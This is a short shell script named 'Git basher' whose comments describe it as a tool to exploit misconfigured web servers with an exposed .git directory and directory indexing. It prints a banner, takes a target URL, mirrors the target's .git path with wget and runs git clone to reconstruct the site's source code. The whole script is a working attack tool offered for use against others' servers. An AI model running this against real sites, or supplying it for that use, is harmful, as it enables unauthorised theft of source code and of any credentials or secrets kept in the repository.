# Git basher is a tool to exploit vulnerable .git misconfigured servers.
# If a server source code has git version control and has directory indexing enabled use this tool to download source code.

#!/bin/sh


cat <<- _EOF_


  ____ ___ _____   ____    _    ____  _   _ _____ ____  
 / ___|_ _|_   _| | __ )  / \  / ___|| | | | ____|  _ \ 
| |  _ | |  | |   |  _ \ / _ \ \___ \| |_| |  _| | |_) |
| |_| || |  | |   | |_) / ___ \ ___) |  _  | |___|  _ < 
 \____|___| |_|   |____/_/   \_\____/|_| |_|_____|_| \_\ 
                                           -- by Phantom

_EOF_


if [ -z "$1" ]
  then
    echo "Usage: main.sh <target_domain>/.git/"
    exit
fi


wget -np -m $1
git clone $1 source
